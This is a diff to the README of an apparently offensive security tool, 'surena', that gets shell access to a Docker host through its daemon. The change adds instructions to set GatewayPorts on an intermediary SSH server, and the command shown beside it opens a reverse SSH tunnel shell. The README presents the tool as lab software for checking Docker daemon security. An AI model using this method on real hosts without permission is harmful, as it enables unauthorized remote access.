@@ -46,7 +46,10 @@ To gain shell access using the Reverse SSH Tunneling method, run this command wi
 surena get-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT --access-method reverse-ssh --ssh-server-address $THIRD_SERVER_IP --ssh-server-username $THIRD_SERVER_USERNAME --ssh-server-password $THIRD_SERVER_PASSWORD --ssh-server-port $THIRD_SERVER_SSH_PORT
 ```
 
-Please note that `$DOCKER_HOST_IP`, `$DOCKER_HOST_PORT`, `$THIRD_SERVER_IP`, `$THIRD_SERVER_USERNAME`, `$THIRD_SERVER_PASSWORD`, and `$THIRD_SERVER_SSH_PORT` should be replaced with the appropriate values.
+Please note that in the remote SSH server or in the `THIRD_SERVER_IP`, which has already been mentioned, the "GatewayPorts" configuration in the `sshd_config` file located at `/etc/ssh/sshd_config` should be changed from `GatewayPorts no` to either `GatewayPorts clientspecified` or `GatewayPorts yes` to enable it.
+
+Additionally, ensure to replace `$DOCKER_HOST_IP`, `$DOCKER_HOST_PORT`, `$THIRD_SERVER_IP`, `$THIRD_SERVER_USERNAME`, `$THIRD_SERVER_PASSWORD`, and `$THIRD_SERVER_SSH_PORT` with the appropriate values.
+
 
 ## Warning
 Surena is intended for lab use and for understanding whether your Docker daemon is secure or insecure. 
